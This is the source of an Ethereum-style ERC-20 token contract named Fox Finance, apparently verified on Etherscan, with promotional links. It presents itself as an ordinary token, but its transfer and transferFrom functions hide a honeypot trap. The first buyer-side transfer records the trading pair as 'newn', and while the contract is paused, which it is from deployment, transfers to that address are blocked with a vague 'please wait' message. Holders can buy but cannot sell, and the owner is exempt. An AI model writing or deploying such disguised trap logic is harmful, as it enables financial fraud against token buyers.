['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-22\n', '*/\n', '\n', '/**\n', '\n', ' ________ ________     ___    ___      ________ ___  ________   ________  ________   ________  _______      \n', '|\\  _____\\\\   __  \\   |\\  \\  /  /|    |\\  _____\\\\  \\|\\   ___  \\|\\   __  \\|\\   ___  \\|\\   ____\\|\\  ___ \\     \n', '\\ \\  \\__/\\ \\  \\|\\  \\  \\ \\  \\/  / /    \\ \\  \\__/\\ \\  \\ \\  \\\\ \\  \\ \\  \\|\\  \\ \\  \\\\ \\  \\ \\  \\___|\\ \\   __/|    \n', ' \\ \\   __\\\\ \\  \\\\\\  \\  \\ \\    / /      \\ \\   __\\\\ \\  \\ \\  \\\\ \\  \\ \\   __  \\ \\  \\\\ \\  \\ \\  \\    \\ \\  \\_|/__  \n', '  \\ \\  \\_| \\ \\  \\\\\\  \\  /     \\/        \\ \\  \\_| \\ \\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ \\  \\\\ \\  \\ \\  \\____\\ \\  \\_|\\ \\ \n', '   \\ \\__\\   \\ \\_______\\/  /\\   \\         \\ \\__\\   \\ \\__\\ \\__\\\\ \\__\\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\_______\\ \\_______\\\n', '    \\|__|    \\|_______/__/ /\\ __\\         \\|__|    \\|__|\\|__| \\|__|\\|__|\\|__|\\|__| \\|__|\\|_______|\\|_______|\n', '                      |__|/ \\|__|  \n', '\n', 'https://foxfinance.io\n', 'https://t.me/foxfinancebsc\n', '\n', '*/\n', '//   SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity ^0.8.4;\n', '\n', 'interface ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is Owned {\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newn;\n', '  bool paused;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '\n', '  constructor() {\n', '    symbol = "FOX";\n', '    name = "Fox Finance";\n', '    decimals = 18;\n', '    paused = true;\n', '    // One trillion\n', '    _totalSupply =  1000000000000 ether;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewn(address _newn) public onlyOwner { newn = _newn; }\n', '  function pause() public onlyOwner { paused = true; }\n', '  function unpause() public onlyOwner { paused = false; }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply - balances[address(0)];\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(!paused || to == owner || to != newn, "please wait");\n', '\n', '    balances[msg.sender] = balances[msg.sender] - tokens;\n', '    balances[to] = balances[to] + tokens;\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '    if(from != address(0) && newn == address(0)) { newn = to; }\n', '    else { require(!paused || from == owner || to == owner || to != newn, "please wait"); }\n', '\n', '    balances[from] = balances[from] - tokens;\n', '    allowed[from][msg.sender] = allowed[from][msg.sender] - tokens;\n', '    balances[to] = balances[to] + tokens;\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '}\n', '\n', 'contract FoxFinance is TokenERC20 {}']